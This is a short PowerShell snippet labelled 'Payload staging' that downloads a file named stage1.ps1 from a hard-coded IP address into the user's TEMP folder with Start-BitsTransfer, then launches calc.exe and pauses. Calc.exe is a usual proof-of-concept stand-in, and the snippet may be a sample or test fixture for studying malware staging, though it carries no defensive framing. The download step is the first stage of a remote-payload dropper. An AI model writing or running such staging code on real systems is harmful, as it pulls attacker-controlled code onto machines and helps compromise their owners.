
<# Payload staging #> $RemoteUrl = 'http://203.0.113.132/stage1.ps1'; $PayloadPath = "$env:TEMP\stage1.bin"; $RequestTimeout = 160; Start-BitsTransfer -Source $RemoteUrl -Destination $PayloadPath; Start-Process -FilePath "calc.exe"; Start-Sleep -Seconds 33; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
